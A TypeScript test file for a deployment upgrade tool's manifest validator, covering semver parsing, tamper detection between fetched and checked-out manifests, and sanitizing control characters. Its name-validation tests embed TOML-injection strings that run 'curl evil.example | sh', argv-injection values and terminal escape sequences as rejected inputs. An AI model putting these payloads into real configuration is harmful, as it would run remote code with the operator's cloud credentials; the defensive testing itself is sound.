/**
 * Manifest validator + semver helpers. These are pure functions over JSON
 * — no I/O, no Workers runtime needed.
 */
import { describe, it, expect } from "vitest";
import {
	validateManifest,
	parseSemver,
	compareSemver,
	isNewer,
	manifestDiffKeys,
	manifestsEqual,
	ManifestError,
	type Manifest,
} from "../scripts/upgrade/manifest";
import { assertBreakingChangesVersioned } from "../scripts/upgrade/build-manifest";

const validRaw: Manifest = {
	version: "0.0.2",
	minPreviousVersion: "0.0.1",
	renderer: { version: 1, eagerRerender: false },
	secrets: [{ name: "JWT_SECRET", required: true, addedIn: "0.0.1" }],
	vars: [],
	kvNamespaces: [{ binding: "RATE_LIMITS", required: true }],
	d1Databases: [
		{ binding: "DB", databaseName: "garrul-db", required: true },
	],
	analyticsDatasets: [
		{ binding: "ANALYTICS", dataset: "garrul_events", required: false },
	],
	migrations: ["0001_init.sql"],
	breakingChanges: [],
};

describe("semver helpers", () => {
	it("parses bare and v-prefixed semver", () => {
		expect(parseSemver("0.0.1")).toEqual([0, 0, 1]);
		expect(parseSemver("v1.2.3")).toEqual([1, 2, 3]);
	});

	it("rejects non-semver strings", () => {
		expect(parseSemver("nope")).toBeNull();
		expect(parseSemver("1.2")).toBeNull();
		expect(parseSemver("")).toBeNull();
	});

	it("compares with v-prefix tolerance", () => {
		expect(compareSemver("v0.0.2", "0.0.1")).toBeGreaterThan(0);
		expect(compareSemver("0.0.1", "v0.0.1")).toBe(0);
		expect(compareSemver("0.1.0", "0.0.9")).toBeGreaterThan(0);
		expect(compareSemver("1.0.0", "0.9.9")).toBeGreaterThan(0);
	});

	it("isNewer", () => {
		expect(isNewer("0.0.2", "0.0.1")).toBe(true);
		expect(isNewer("0.0.1", "0.0.2")).toBe(false);
		expect(isNewer("0.0.1", "0.0.1")).toBe(false);
	});
});

describe("validateManifest", () => {
	it("accepts a well-formed manifest", () => {
		const m = validateManifest(JSON.parse(JSON.stringify(validRaw)));
		expect(m.version).toBe("0.0.2");
		expect(m.secrets[0]?.name).toBe("JWT_SECRET");
	});

	it("rejects missing version", () => {
		const bad = { ...validRaw } as Partial<Manifest>;
		delete bad.version;
		expect(() => validateManifest(bad)).toThrow(ManifestError);
	});

	it("rejects invalid semver in version", () => {
		expect(() =>
			validateManifest({ ...validRaw, version: "not-a-semver" }),
		).toThrow(/valid semver/);
	});

	it("rejects non-array migrations", () => {
		expect(() =>
			validateManifest({ ...validRaw, migrations: "wat" as unknown as string[] }),
		).toThrow(ManifestError);
	});

	it("rejects unknown shapes", () => {
		expect(() => validateManifest(null)).toThrow(ManifestError);
		expect(() => validateManifest("string")).toThrow(ManifestError);
	});

	it("requires required:boolean on secret entries", () => {
		const bad = {
			...validRaw,
			secrets: [{ name: "X" }],
		};
		expect(() => validateManifest(bad)).toThrow(ManifestError);
	});

	it("rejects malformed addedIn on secret entries", () => {
		const bad = {
			...validRaw,
			secrets: [{ name: "X", required: true, addedIn: "not-a-version" }],
		};
		expect(() => validateManifest(bad)).toThrow(/valid semver/);
	});

	it("rejects malformed addedIn on kv/d1/analytics entries", () => {
		expect(() =>
			validateManifest({
				...validRaw,
				kvNamespaces: [
					{ binding: "K", required: true, addedIn: "nope" },
				],
			}),
		).toThrow(/valid semver/);
		expect(() =>
			validateManifest({
				...validRaw,
				d1Databases: [
					{
						binding: "DB",
						databaseName: "garrul-db",
						required: true,
						addedIn: "1.x",
					},
				],
			}),
		).toThrow(/valid semver/);
		expect(() =>
			validateManifest({
				...validRaw,
				analyticsDatasets: [
					{
						binding: "A",
						dataset: "d",
						required: false,
						addedIn: "v",
					},
				],
			}),
		).toThrow(/valid semver/);
	});

	// The manifest arrives over the network and its strings are interpolated into
	// the operator's wrangler.toml and passed to wrangler as argv. A `"` plus a
	// newline in a binding name injects a TOML table — `[build] command = "..."`
	// executes on the `wrangler deploy` the upgrade runs moments later, with the
	// operator's Cloudflare credentials loaded.
	describe("name validation", () => {
		const TOML_INJECTION = 'DB"\n[build]\ncommand = "curl evil.example | sh"\nx = "';

		it("rejects a TOML-injecting KV binding", () => {
			expect(() =>
				validateManifest({
					...validRaw,
					kvNamespaces: [{ binding: TOML_INJECTION, required: true }],
				}),
			).toThrow(/must be a binding name/);
		});

		it("rejects a TOML-injecting D1 binding and database name", () => {
			expect(() =>
				validateManifest({
					...validRaw,
					d1Databases: [
						{
							binding: TOML_INJECTION,
							databaseName: "garrul-db",
							required: true,
						},
					],
				}),
			).toThrow(/must be a binding name/);
			expect(() =>
				validateManifest({
					...validRaw,
					d1Databases: [
						{
							binding: "DB",
							databaseName: 'garrul-db"\n[build]\ncommand = "sh"\nx = "',
							required: true,
						},
					],
				}),
			).toThrow(/must be a D1 database name/);
		});

		it("rejects a leading dash (argv injection into the wrangler call)", () => {
			expect(() =>
				validateManifest({
					...validRaw,
					d1Databases: [
						{ binding: "DB", databaseName: "--help", required: true },
					],
				}),
			).toThrow(/must be a D1 database name/);
			expect(() =>
				validateManifest({
					...validRaw,
					secrets: [{ name: "--config", required: true }],
				}),
			).toThrow(/must be an env-var name/);
		});

		it("rejects names with whitespace or quotes", () => {
			for (const binding of ['A"B', "A B", "A\tB", ""]) {
				expect(() =>
					validateManifest({
						...validRaw,
						kvNamespaces: [{ binding, required: true }],
					}),
				).toThrow(/must be a binding name/);
			}
		});

		it("rejects an over-long name", () => {
			expect(() =>
				validateManifest({
					...validRaw,
					secrets: [{ name: "A".repeat(65), required: true }],
				}),
			).toThrow(/must be an env-var name/);
		});

		it("keeps the offending value escaped in the error message", () => {
			// The message goes to the operator's terminal; a raw escape sequence in
			// it could rewrite what they see.
			expect(() =>
				validateManifest({
					...validRaw,
					secrets: [{ name: `X${String.fromCharCode(27)}[2J`, required: true }],
				}),
			).toThrow(/\\u001b/);
		});

		it("still accepts the real manifest's names", () => {
			const m = validateManifest(JSON.parse(JSON.stringify(validRaw)));
			expect(m.kvNamespaces[0]?.binding).toBe("RATE_LIMITS");
			expect(m.d1Databases[0]?.databaseName).toBe("garrul-db");
			expect(m.analyticsDatasets[0]?.dataset).toBe("garrul_events");
		});
	});

	it("accepts a well-formed addedIn semver", () => {
		const m = validateManifest({
			...validRaw,
			secrets: [{ name: "X", required: true, addedIn: "v1.2.3" }],
		});
		expect(m.secrets[0]?.addedIn).toBe("v1.2.3");
	});
});

/**
 * `npm run upgrade` builds its plan from the manifest fetched over HTTPS at
 * the tag, then deploys whatever `git checkout <tag>` produced — two
 * transports, and until now nothing compared them. These back the check that
 * runs after checkout and before the first migration.
 */
describe("manifestsEqual", () => {
	const clone = (m: Manifest): Manifest =>
		validateManifest(JSON.parse(JSON.stringify(m)));

	it("accepts two validated copies of the same manifest", () => {
		expect(manifestsEqual(clone(validRaw), clone(validRaw))).toBe(true);
	});

	it("ignores JSON key order, which differs by serializer not by content", () => {
		// The validator fixes field order, so a manifest whose file happens to
		// list keys differently must not read as a mismatch and abort an
		// otherwise fine upgrade.
		const reordered = validateManifest({
			breakingChanges: [],
			migrations: ["0001_init.sql"],
			analyticsDatasets: validRaw.analyticsDatasets,
			d1Databases: validRaw.d1Databases,
			kvNamespaces: validRaw.kvNamespaces,
			secrets: validRaw.secrets,
			renderer: validRaw.renderer,
			minPreviousVersion: "0.0.1",
			version: "0.0.2",
		});
		expect(manifestsEqual(reordered, clone(validRaw))).toBe(true);
	});

	it("catches a migration present in one copy and not the other", () => {
		// The case that matters most: the plan the operator approved listed one
		// set of pending migrations, and the tree about to run them lists
		// another. Migrations are the hardest step to walk back.
		const tampered = validateManifest({
			...JSON.parse(JSON.stringify(validRaw)),
			migrations: ["0001_init.sql", "0002_surprise.sql"],
		});
		expect(manifestsEqual(tampered, clone(validRaw))).toBe(false);
		expect(manifestDiffKeys(tampered, clone(validRaw))).toEqual(["migrations"]);
	});

	it("catches an added required secret", () => {
		const tampered = validateManifest({
			...JSON.parse(JSON.stringify(validRaw)),
			secrets: [
				...validRaw.secrets,
				{ name: "EXFIL_TOKEN", required: true, addedIn: "0.0.2" },
			],
		});
		expect(manifestsEqual(tampered, clone(validRaw))).toBe(false);
		expect(manifestDiffKeys(tampered, clone(validRaw))).toEqual(["secrets"]);
	});

	it("catches a swapped D1 database name", () => {
		const tampered = validateManifest({
			...JSON.parse(JSON.stringify(validRaw)),
			d1Databases: [
				{ binding: "DB", databaseName: "attacker-db", required: true },
			],
		});
		expect(manifestsEqual(tampered, clone(validRaw))).toBe(false);
	});

	it("reports every differing field, sorted, for the error message", () => {
		const tampered = validateManifest({
			...JSON.parse(JSON.stringify(validRaw)),
			version: "9.9.9",
			migrations: ["0001_init.sql", "0002_x.sql"],
		});
		expect(manifestDiffKeys(tampered, clone(validRaw))).toEqual([
			"migrations",
			"version",
		]);
	});

	it("reports nothing when the manifests agree", () => {
		expect(manifestDiffKeys(clone(validRaw), clone(validRaw))).toEqual([]);
	});
});

describe("free-text sanitization", () => {
	// printPlan console.logs these fields verbatim, and it runs BEFORE applyPlan
	// cross-checks the fetched manifest against the git tag — so when the
	// operator reads the plan and decides whether to type "yes", this text is
	// still nothing but a network response. A CSI sequence or a bare \r in a
	// summary can overwrite the real "manual steps required" line with a fake
	// "nothing to do" one.
	const ESC = "\u001B";
	const CSI8 = "\u009B";
	const CONTROL = /[\u0000-\u001F\u007F-\u009F]/;

	it("strips ANSI escapes and newlines from a breaking change", () => {
		const m = validateManifest({
			...JSON.parse(JSON.stringify(validRaw)),
			breakingChanges: [
				{
					id: `bc-1${ESC}[2K`,
					summary: "real warning\r  - nothing to do here",
					manualSteps: [`step one${CSI8}[1A`, "step two"],
				},
			],
		});
		const bc = m.breakingChanges[0] as {
			id: string;
			summary: string;
			manualSteps: string[];
		};
		expect(bc.id).toBe("bc-1[2K");
		expect(bc.summary).toBe("real warning  - nothing to do here");
		expect(bc.manualSteps).toEqual(["step one[1A", "step two"]);
		// Inert on a terminal now: no ESC, no 8-bit CSI, no CR/LF.
		expect(CONTROL.test([bc.id, bc.summary, ...bc.manualSteps].join(""))).toBe(
			false,
		);
	});

	it("strips control characters from every description field", () => {
		const m = validateManifest({
			...JSON.parse(JSON.stringify(validRaw)),
			secrets: [
				{ name: "JWT_SECRET", required: true, description: `a${ESC}[31mb` },
			],
			vars: [{ name: "SOME_FLAG", required: false, description: "c\nd" }],
			kvNamespaces: [
				{ binding: "RATE_LIMITS", required: true, description: "e\rf" },
			],
		});
		expect((m.secrets[0] as { description: string }).description).toBe("a[31mb");
		expect((m.vars[0] as { description: string }).description).toBe("cd");
		expect((m.kvNamespaces[0] as { description: string }).description).toBe("ef");
	});

	it("carries addedIn through on a breaking change", () => {
		const m = validateManifest({
			...JSON.parse(JSON.stringify(validRaw)),
			breakingChanges: [
				{ id: "bc-1", summary: "s", manualSteps: [], addedIn: "2.7.1" },
			],
		});
		expect(m.breakingChanges[0]?.addedIn).toBe("2.7.1");
	});

	it("accepts a breaking change with no addedIn", () => {
		// Every manifest published before 2.7.1 is like this, and `upgrade`
		// parses the *installed* version's manifest off its tag — making the
		// field required here would break planning for every existing install.
		const m = validateManifest({
			...JSON.parse(JSON.stringify(validRaw)),
			breakingChanges: [{ id: "bc-1", summary: "s", manualSteps: [] }],
		});
		expect(m.breakingChanges[0]?.addedIn).toBeUndefined();
	});

	it("rejects a non-semver addedIn on a breaking change", () => {
		expect(() =>
			validateManifest({
				...JSON.parse(JSON.stringify(validRaw)),
				breakingChanges: [
					{ id: "bc-1", summary: "s", manualSteps: [], addedIn: "soon" },
				],
			}),
		).toThrow(ManifestError);
	});

	it("still rejects a control character in a structural field", () => {
		// The sanitizer must stay out of requireString: a binding name with a
		// newline has to fail the allowlist, not get quietly cleaned into one
		// that passes it.
		expect(() =>
			validateManifest({
				...JSON.parse(JSON.stringify(validRaw)),
				kvNamespaces: [{ binding: "RATE\nLIMITS", required: true }],
			}),
		).toThrow(ManifestError);
	});
});

describe("assertBreakingChangesVersioned", () => {
	// The schema keeps `addedIn` optional so old published manifests still
	// parse. That leaves this repo's own manifest as the only place the
	// requirement can be enforced — `manifest:check` runs it in CI.
	it("accepts entries that all declare addedIn", () => {
		expect(() =>
			assertBreakingChangesVersioned([
				{ id: "a", summary: "s", manualSteps: [], addedIn: "2.0.0" },
			]),
		).not.toThrow();
	});

	it("names every entry missing addedIn", () => {
		expect(() =>
			assertBreakingChangesVersioned([
				{ id: "ok", summary: "s", manualSteps: [], addedIn: "2.0.0" },
				{ id: "forgot-one", summary: "s", manualSteps: [] },
				{ id: "forgot-two", summary: "s", manualSteps: [] },
			]),
		).toThrow(/forgot-one, forgot-two/);
	});

	it("accepts an empty list", () => {
		expect(() => assertBreakingChangesVersioned([])).not.toThrow();
	});
});
